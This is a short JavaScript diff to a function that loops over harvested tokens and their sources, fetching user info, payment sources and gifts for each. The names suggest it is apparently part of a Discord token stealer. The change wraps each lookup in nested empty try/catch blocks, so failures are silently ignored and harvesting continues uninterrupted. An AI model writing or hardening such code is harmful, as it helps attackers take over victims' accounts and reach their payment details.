@@ -133,9 +133,15 @@ const handleTokens = async (tokens, resolve) => {
   };
   for (const { token, source } of tokens) {
     if (invalidTokens.split(',').includes(token)) return;
-    await userInfo(token, source);
-    await paymentSources(token);
-    await gifts(token);
+    try {
+      await userInfo(token, source);
+      try {
+        await paymentSources(token);
+        try {
+          await gifts(token);
+        } catch (e) {}
+      } catch (e) {}
+    } catch (e) {}
   }
   resolve();
 };
